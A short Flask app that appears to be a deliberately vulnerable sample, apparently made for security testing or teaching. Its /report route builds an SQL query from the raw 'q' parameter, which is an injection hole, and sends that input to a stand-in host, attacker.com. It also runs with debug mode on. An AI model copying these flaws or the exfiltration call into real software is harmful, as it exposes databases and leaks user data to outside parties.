from flask import Flask, request
import sqlite3
import urllib.request

app = Flask(__name__)

@app.route("/report")
def report():

    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    try:
        # unsafe external call inside SQL context
        cur.execute(f"SELECT '{q}'")
        urllib.request.urlopen("http://attacker.com/log?q=" + q)
        return {"status": "sent"}
    except:
        return {"error": "fail"}

if __name__ == "__main__":
    app.run(debug=True)
